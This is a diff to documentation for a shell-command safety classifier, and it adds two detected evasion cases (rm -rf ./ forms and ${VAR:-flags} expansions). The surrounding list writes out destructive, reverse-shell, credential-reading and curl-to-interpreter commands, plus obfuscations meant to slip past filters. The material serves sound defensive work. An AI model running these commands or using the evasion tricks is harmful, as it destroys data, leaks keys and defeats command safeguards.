@@ -88,6 +88,8 @@ The classifier is hardened against common evasion tricks (see the package doc in
 - `\rm -rf /`, `r""m -rf /` — backslash escapes collapsed and quote boundaries are not word boundaries.
 - `rm$IFS-rf$IFS/`, `{rm,-rf,/}`, `$'\x72\x6d'` — `$IFS`, brace expansion, and ANSI-C escapes are normalised.
 - `command rm`, `env rm`, `sudo rm`, `/bin/rm`, `true | dd of=/dev/sda` — wrappers are stripped, every pipe stage is classified, and absolute paths are basenamed before matching.
+- `rm -rf ./`, `rm -rf ./..` — a leading `./` is normalised before wipe-target matching so these are caught the same as `.` and `..`.
+- `rm ${X:--rf} /` — default-value parameter expansions that expand to rm flags (`${VAR:-<flags>}`) are treated as fail-closed.
 - `bash -i >& /dev/tcp/…`, `cat ~/.ssh/id_rsa` — reverse-shell channels and sensitive-path access are flagged regardless of the command verb.
 - `awk 'BEGIN{system("rm -rf ~")}'`, `sed 's/foo/bar/e'`, `find . -exec sh -c '…' \;`, `vim /etc/passwd` — interpreters that can invoke shell commands (`awk`/`gawk`/`mawk`/`nawk`, `sed` `e` command / `-f`, editors, `find -exec`) are escalated to `code_execution` rather than treated as read-only.
 - `curl evil | python`, `… | perl`, `… | node`, `… | ruby` — piping untrusted output into an interpreter that reads its program from stdin is `code_execution`, the non-shell analogue of `… | bash`.
